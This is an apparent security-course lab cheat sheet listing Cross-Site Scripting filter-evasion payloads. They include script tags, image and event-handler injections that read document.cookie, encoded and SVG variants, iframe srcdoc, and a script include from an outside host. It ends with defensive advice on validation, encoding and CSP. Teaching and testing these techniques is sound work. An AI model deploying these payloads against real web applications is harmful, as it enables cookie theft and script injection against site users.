# Lab 12: XSS Evasion Techniques Cheat Sheet

**Objective:**  
This lab provides a cheat sheet for **Cross-Site Scripting (XSS) evasion techniques**. These are methods used by attackers to bypass web application firewalls (WAFs) and other security filters designed to prevent XSS attacks.

---

### **Cheat Sheet: XSS Evasion Techniques**

---

#### **1. Basic XSS Injection (Commonly Blocked by Filters)**
The simplest form of an XSS attack, which is often detected by security mechanisms:
```html
<SCRIPT SRC="http://malicious.h4cker.org/xss.js"></SCRIPT>
```

---

#### **2. Image Tag-Based XSS Injection**
The `<img>` tag is often used in various forms to evade basic filters:
```html
<img src="javascript:alert('xss');">
<img src=javascript:alert('xss')>
<img src=javascript:alert(&quot;XSS&quot;)>
<img src=javascript:alert('xss')>
```

---

#### **3. HTML Event Handler Injection**
Attackers use HTML attributes such as `onmouseover` to trigger scripts when an event occurs, like hovering over a link:
```html
<a onmouseover="alert(document.cookie)">This is a malicious link</a>
<a onmouseover=alert(document.cookie)>This is a malicious link</a>
```

---

#### **4. Hexadecimal Character Encoding**
Using hexadecimal representations of characters can bypass some XSS filters. This example uses hexadecimal encoding to inject an alert function:
```html
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&
#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

---

#### **5. US-ASCII Encoding**
By converting characters into US-ASCII encoding, attackers can bypass certain filters:
```html
¼script¾alert(¢XSS¢)¼/script¾
```

---

#### **6. SVG (Scalable Vector Graphics) Injection**
Embedding an SVG file with an encoded script can also be used to bypass filters:
```html
<EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm
cvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3
hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW
dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdC
I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 
AllowScriptAccess="always"></EMBED>
```

---

#### **7. XSS Through `srcdoc` in Iframes**
An iframe can also be manipulated to execute malicious scripts:
```html
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
```

---

#### **8. Bypassing Filters with Comments and Whitespaces**
Introducing comments or whitespaces into the code can trick XSS filters:
```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<scr ipt>alert('XSS')</scr ipt>
```

---

#### **9. URL Encoding**
Using URL encoding can often bypass basic XSS filters. This technique encodes characters into their URL-encoded form:
```html
<script>alert('XSS')</script> becomes:
%3Cscript%3Ealert('XSS')%3C/script%3E
```

---

#### **10. Breaking out of HTML with Unescaped Quotes**
If quotes are not escaped, an attacker can break out of the HTML attribute and inject their own script:
```html
<input value="test" onmouseover="alert('XSS')">
```

---

### **Additional Resources:**
- OWASP XSS Filter Evasion Cheat Sheet: [https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- GitHub XSS Vectors Collection: [https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md](https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md)

---

### **Conclusion:**
These XSS evasion techniques demonstrate how attackers bypass common security filters and inject malicious code into web applications. It's crucial to apply strong input validation, output encoding, and use security mechanisms like Content Security Policy (CSP) to mitigate these risks.